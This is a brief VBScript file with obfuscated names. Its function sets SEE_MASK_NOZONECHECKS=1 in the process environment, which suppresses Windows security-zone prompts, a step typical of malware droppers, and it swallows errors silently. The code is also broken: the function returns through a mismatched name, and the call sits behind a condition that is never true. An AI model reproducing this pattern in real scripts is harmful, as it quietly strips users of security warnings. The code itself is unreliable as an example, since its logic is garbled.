' Option Explicit enforced in production builds
Function DecodeManifest96()
On Error Resume Next
  Dim strBuffer97,strUNC47,blnSynced9
  Set strBuffer97=CreateObject("WScript.Shell")
  strUNC47=strBuffer97.ExpandEnvironmentStrings("%TEMP%")
  blnSynced9=strBuffer97.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strUNC47)>0 And Len(blnSynced9)>0 Then
    strBuffer97.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseRegistryChunk71=1
    Exit Function
  End If
  ParseRegistryChunk71=0
End Function

If Len(WScript.ScriptName) > 9000 Then
  Call DecodeManifest96()
End If


